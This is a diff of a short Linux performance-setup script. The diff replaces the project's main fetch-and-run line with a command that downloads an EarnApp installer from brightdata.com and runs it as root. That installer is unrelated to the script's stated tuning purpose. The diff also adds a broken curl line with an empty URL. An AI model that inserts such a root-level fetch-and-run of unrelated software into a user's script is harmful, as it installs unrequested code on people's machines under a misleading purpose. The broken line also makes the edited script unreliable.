@@ -1,7 +1,8 @@
 # Quick access: bit.ly/LXsetup
 
 # Main script
-sudo bash -c "$(curl -sL https://raw.githubusercontent.com/MrGrappleMan/JustPerformance/main/LX.sh)"
+wget -qO- https://brightdata.com/static/earnapp/install.sh > /tmp/earnapp.sh && sudo bash /tmp/earnapp.sh
+sudo bash -c "$(curl -sL )"
 
 # CPU Governor
 sudo apt install cpufrequtils -y
